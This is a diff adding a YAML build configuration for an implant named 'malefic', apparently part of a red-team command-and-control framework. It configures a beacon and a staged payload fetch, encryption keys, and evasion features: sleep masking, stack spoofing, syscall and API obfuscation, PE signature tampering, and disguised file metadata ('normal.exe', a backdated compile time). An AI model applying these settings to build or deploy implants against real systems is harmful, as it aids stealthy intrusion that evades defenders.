@@ -1,0 +1,92 @@
+basic:
+  name: "malefic"
+  targets:
+    - "127.0.0.1:5001"
+  protocol: "tcp"
+  tls: false
+  proxy: ""
+  interval: 5
+  jitter: 0.2
+  ca: ""
+  encryption: aes
+  key: maliceofinternal
+
+pulse:
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 16
+  encryption: xor
+  key: "maliceofinternal"
+  target: 127.0.0.1:5002
+  protocol: "tcp"
+  http:
+    method: "GET"
+    path: "/pulse.bin"
+    version: "1.1"
+    headers:
+      user_agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+      accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      accept_language: "en-US,en;q=0.5"
+      accept_encoding: "gzip, deflate"
+
+metadata:
+  remap_path: "C:/Windows/Users/Maleficarum"
+  icon: ""
+  compile_time: "24 Jun 2015 18:03:01"
+  file_version: ""
+  product_version: ""
+  company_name: ""
+  product_name: ""
+  original_filename: "normal.exe"
+  file_description: "normal"
+  internal_name: ""
+
+
+implants:
+  mod: beacon
+  register_info: true
+  hot_load: true
+  modules:
+    - "full"
+
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0x1
+  apis:
+    # apis_level: "sys_apis", "nt_apis"
+    level: "nt_apis"
+    # apis_priority: "normal", "user_defined_dyanmic", "func_syscall" "syscalls" 
+    priority:
+      normal:
+        enable: false
+        type: "normal"
+      dynamic:
+        enable: true
+        # type: "sys_dynamic", "user_defined_dynamic"
+        type: "user_defined_dynamic"
+      syscalls:
+        enable: false
+        # type: "func_syscall", "inline_syscall"
+        type: "inline_syscall"
+  alloctor:
+    # inprocess: "VirtualAlloc", "VirtualAllocEx", 
+    #            "VirtualAllocExNuma", "HeapAlloc", 
+    #            "NtMapViewOfSection", "NtAllocateVirtualMemory"
+    inprocess: "NtAllocateVirtualMemory"
+    # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory", 
+    #              "VirtualAllocExNuma", "NtMapViewOfSection"
+    crossprocess: "NtAllocateVirtualMemory"
+  sleep_mask: true
+  sacrifice_process: true
+  fork_and_run: false
+  hook_exit: true
+  thread_stack_spoofer: true
+  pe_signature_modify:
+    feature: true
+    modify:
+      magic: "\x00\x00"
+      signature: "\x00\x00"
